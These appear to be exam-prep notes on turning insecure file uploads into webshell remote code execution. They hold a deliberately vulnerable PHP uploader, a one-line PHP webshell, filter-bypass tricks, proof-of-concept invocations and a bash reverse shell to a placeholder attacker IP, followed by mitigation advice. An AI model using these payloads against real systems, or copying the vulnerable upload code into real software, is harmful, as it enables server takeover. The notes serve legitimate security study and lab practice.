## Docker lab

Preferred setup: `cd labs && ./labctl.sh up` (see [`lab/README.md`](lab/README.md) and [`labs/README.md`](../../labs/README.md)).

---

# File Upload to Webshell RCE PoC Notes

## Vulnerability Summary
- **Target**: Web applications (PHP, ASP.NET, Java, Node, etc.) accepting user file uploads
- **CVE**: N/A (extremely common pattern across real apps and CTFs)
- **Type**: Insecure File Upload → Webshell deployment → Remote Code Execution
- **Impact**: Full RCE as the web server user (www-data, apache, iis, etc.). Often the final link in a chain (auth bypass → upload, SQLi → write via INTO OUTFILE, XSS → CSRF upload, etc.).

## Vulnerability Details

### Attack Chain (Typical)
1. **Recon**: Locate upload functionality (profile pictures, document import, admin "add plugin/theme", avatar, import CSV/XML, etc.).
2. **Analyze filters**: What extensions are allowed? Does it check Content-Type? Magic bytes / MIME sniffing? Does it rename or sanitize the filename? Where does it write the file?
3. **Craft bypass**: Choose technique(s) that defeat the observed (or assumed) checks.
4. **Upload** the weaponized file (webshell).
5. **Locate** the file on disk via response disclosure, predictable paths, or brute-forcing common dirs.
6. **Execute** via direct HTTP request to the shell (`?cmd=id`) or via another vulnerability (LFI that includes the uploaded path).
7. **Verify + escalate**: Command output, callback, write a better persistent shell, read app source / configs, pivot internally.

### Root Cause
The application accepts a file from an untrusted user and places it (or a derivative) into a location that is both **writable by the web process** and **directly or indirectly executable / includable by the web server**.

Common developer mistakes:
- Client-side only validation (easy to bypass with Burp).
- Extension allow-list that is incomplete or case-sensitive.
- Trusting the `Content-Type` header sent by the client.
- Using `move_uploaded_file()` + original filename without sanitization (`basename()` only removes path, not dangerous extensions).
- Storing uploads inside the web root (e.g. `/var/www/html/uploads/`) instead of outside + controlled serving.
- No content validation / magic byte checks for "image" uploads that are actually code.
- Allowing `..` or null bytes in older PHP.

**Vulnerable PHP pattern (very common in labs and real apps)**:
```php
<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

// Weak check
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
    die("Sorry, only JPG, JPEG & PNG files allowed.");
}

if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
    echo "The file ". basename($_FILES["file"]["name"]). " has been uploaded.";
} 
?>
```
Problems: only looks at client-provided extension in the name; no magic byte validation; file is written inside webroot with original (dangerous) name.

**Slightly better but still often bypassable**:
- Server-side extension check using `in_array` on exploded name (still vulnerable to double extension on Apache if `AddHandler` is loose).
- Content-Type check only.

## Lab Setup

### Quick Vulnerable PHP Target (for practice)
Create a minimal vulnerable uploader:

```bash
mkdir -p /tmp/vuln-upload/uploads
cd /tmp/vuln-upload
cat > upload.php << 'PHP'
<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);
$ext = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
if (!in_array($ext, ["jpg","jpeg","png","gif"])) {
    die("Only images allowed!");
}
if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
    echo "Uploaded to: " . $target_file;
} else {
    echo "Upload failed";
}
PHP

# Run a simple PHP server (or use Apache/Nginx + PHP-FPM)
php -S 0.0.0.0:8080
```

Then use the PoC against `http://localhost:8080/upload.php`.

For more realistic: add a weak "admin" area, or combine with the ATutor-style or custom app that has file upload after a trivial auth bypass.

### Docker-friendly
Many VulnHub / CTF images and the course labs contain upload points. HTB Popcorn and Vault are classic file-upload machines.

### ASP.NET / IIS example (for .aspx shells)
See the vulnerable code snippets in the PoC header comments or in the mssql PoC Notes for patterns; the same upload weaknesses exist.

## Exploit Chain (Manual + PoC)

### Manual Quick Test
1. Upload `test.php.jpg` containing `<?php system($_GET['cmd']); ?>` with Content-Type `image/jpeg`.
2. Browse to `http://target/uploads/test.php.jpg?cmd=id`.
3. If it executes, great. If 403/404, try other directories or double-ext variants.

### Using the PoC
```bash
# Basic (most reliable starting point for PHP apps)
python3 poc.py 192.168.1.10 80 --endpoint /upload.php \
  --bypass double_ext --shell-type php --command whoami \
  10.10.14.5 4444

# Magic bytes bypass (when they check file signature)
python3 poc.py target 8080 --bypass magic_bytes --shell-type php \
  --command "cat /etc/passwd" 10.10.14.5 9001

# ASPX target (IIS)
python3 poc.py 10.10.10.50 80 --endpoint /admin/upload.aspx \
  --bypass content_type --shell-type aspx --command whoami \
  10.10.14.5 4444

# With Burp
python3 poc.py ... --proxy http://127.0.0.1:8080
```

The PoC will:
- Try the chosen bypass
- Upload
- Probe common dirs + use your `--upload-dir`
- Verify by requesting `shell?cmd=...` and looking for output markers
- Print the final usable shell URL

## Bypass Techniques (Cheat Sheet)

| Bypass Method     | Filename Example          | Content-Type     | Extra Trick                  | Works Against (common)          | Notes |
|-------------------|---------------------------|------------------|------------------------------|---------------------------------|-------|
| Double extension  | shell.php.jpg            | image/jpeg      | -                            | Simple ext allow-lists (Apache) | Apache may still execute .php inside .jpg if config allows |
| Content-Type lie  | shell.php                | image/png       | -                            | Header-only checks              | Very common in "image only" uploads |
| Magic bytes       | shell.php                | image/gif       | Prepend GIF89a or JPEG SOI   | `file` / exif / basic mime sniff| PHP still parses from <?php even with GIF header |
| Case variation    | shell.PHP                | ...             | -                            | Case-sensitive filters          | Windows is case-insensitive |
| Null byte (legacy)| shell.php%00.jpg         | image/jpeg      | -                            | Old PHP <5.3.4 + move+include   | Rare now but still appears in old labs |
| Combined          | shell.php.jpg            | image/jpeg      | + magic bytes + case         | Multiple weak checks            | Best starting point in unknown apps |
| .phar             | evil.phar                | ...             | + serialized metadata        | File ops on user path + PHAR    | See PHP deserial guide |

**Pro tip**: Many real filters can be defeated by `shell.pHp` or `shell.php.` (trailing dot on Windows) or `shell.php:1.jpg` (NTFS ADS, older).

## Verification & Post-Exploitation
- Direct: `curl 'http://target/uploads/shell.php?cmd=whoami'`
- OOB ping from shell: `ping -c 4 YOUR_IP`
- Write a better shell: `echo '<?php ... full featured ... ?>' > /tmp/better.php` then move it.
- Read source: `cat /var/www/html/index.php` or `find /var/www -name "*.php" 2>/dev/null | head`
- Reverse shell from the webshell (once you have RCE):
  ```bash
  curl 'http://target/shell.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261"'
  ```

## OSWE Exam Tips
- **Time management**: Upload is often one of the fastest RCEs once you have any form of write access (after auth bypass, SQLi write, etc.). Don't overthink — try the top 3 bypasses quickly.
- **Always check response body** after upload. Apps frequently echo the saved path or filename.
- **Common locations**: `/uploads/`, `/files/`, `/images/`, `/user_uploads/`, web root itself, `/tmp/` (sometimes includable).
- **Chaining king**: File upload + LFI / path traversal / deserial of uploaded file / second-order include of the filename is extremely common in the course and real vulns.
- **Report clearly**: "Uploaded `shell.php.jpg` (double extension + image/jpeg). File written to `/var/www/html/uploads/shell.php.jpg`. Executed via direct request. Confirmed RCE as www-data."
- **Verify side effects**: Even if output is not reflected, create a marker file (`touch /tmp/pwned_by_me`) or use time-based / OOB.
- **Code review speed**: Grep for `move_uploaded_file`, `$_FILES`, `basename.*name`, `pathinfo.*extension`, `in_array.*ext`, `getimagesize`, `exif_imagetype`. Then trace where the file ends up and whether it can be executed/included.

## Debugging Common Failures
- 403/404 on shell → wrong directory or file was renamed/sanitized. Inspect upload response more carefully; try `--upload-dir /` or other candidates.
- Shell file is there but 500 when accessed → syntax error in your shell (check for `<?php` at the very top after magic bytes).
- Upload "succeeds" but file not on disk → app may be storing outside webroot or using a DB/blob store.
- WAF blocking → try more obfuscated shells or split the upload + execution across two different bypasses.

## Mitigation (for the "Findings" section of reports)
**Immediate**:
- Move uploads **outside** the web root.
- Rename files on upload using a safe random name + forced safe extension (or no extension and serve via a download script that sets correct headers).
- Strict server-side extension whitelist (never trust client).
- Use `getimagesize()` + re-encode images (or use a library that strips metadata and re-writes the image).

**Better**:
- Store in object storage (S3) with no public execute.
- Use a dedicated file serving endpoint that never executes the content.
- Content-Disposition + X-Content-Type-Options: nosniff on all user uploads.
- Least privilege for web user (no write to any webroot dir).

## References & Further Reading
- HackTricks File Upload: https://book.hacktricks.xyz/pentesting-web/file-upload
- PayloadsAllTheThings Upload Insecure Files: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- PortSwigger: https://portswigger.net/web-security/file-upload
- HTB Popcorn & Vault writeups (classic file upload machines)
- This repo: advanced-skeleton examples (step upload placeholder), `guides/Code-Review-Checklists.md` (file ops section), Roadmap Week 6

See the PoC source for the exact bypass implementation and the root `README.md` / Roadmap for how this fits into full OSWE preparation.

**Good luck — file upload is one of the most reliable and satisfying RCE vectors in the exam.**
